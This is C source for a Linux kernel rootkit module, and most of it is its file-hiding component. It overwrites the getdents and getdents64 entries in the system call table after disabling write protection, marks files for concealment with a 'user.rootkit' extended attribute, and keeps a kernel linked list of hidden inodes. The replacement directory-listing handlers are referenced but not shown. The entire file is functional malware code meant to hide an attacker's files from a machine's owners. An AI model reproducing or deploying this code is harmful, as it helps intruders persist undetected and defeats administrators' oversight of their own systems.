#include <linux/xattr.h>
#include <linux/fs.h>
#include <linux/fdtable.h>

#define FILEHIDE_XATTR_NAME "user.rootkit"
#define FILEHIDE_XATTR_VAL "rootkit"

#include "common.h"
#include "filehide.h"
#include "hook.h"

#define SIZE 64

void
hide_files(void)
{
    disable_protection();
    sys_calls[__NR_getdents] = (void *)g7_getdents;
    sys_calls[__NR_getdents64] = (void *)g7_getdents64;
    enable_protection();
}

void
unhide_files(void)
{
    disable_protection();
    sys_calls[__NR_getdents] = (void *)sys_getdents;
    sys_calls[__NR_getdents64] = (void *)sys_getdents64;
    enable_protection();
}


unsigned long
must_hide_inode(struct dentry *dentry)
{
    char buf[SIZE];

    if(dentry && dentry->d_inode)
        if(!inode_permission(dentry->d_inode, MAY_READ)) {
            ssize_t len = vfs_getxattr(dentry, FILEHIDE_XATTR_NAME, buf, SIZE);

            if (len > 0 && !strncmp(FILEHIDE_XATTR_VAL, buf, len))
                return dentry->d_inode->i_ino;
        }

    return 0;
}

bool
list_contains_inode(inode_list_t_ptr node, unsigned long inode)
{
    inode_list_t_ptr i;
    for (i = node; i; i = i->next)
        if (i->inode == inode)
            return true;

    return false;
}

inode_list_t_ptr
add_inode_to_list(inode_list_t_ptr tail, unsigned long inode)
{
    inode_list_t_ptr node;
    node = (inode_list_t_ptr)kzalloc(sizeof(inode_list_t), GFP_KERNEL);

    if (node) {
        node->inode = inode;
        node->next = NULL;
        tail->next = node;
        return node;
    }

    return NULL;
}
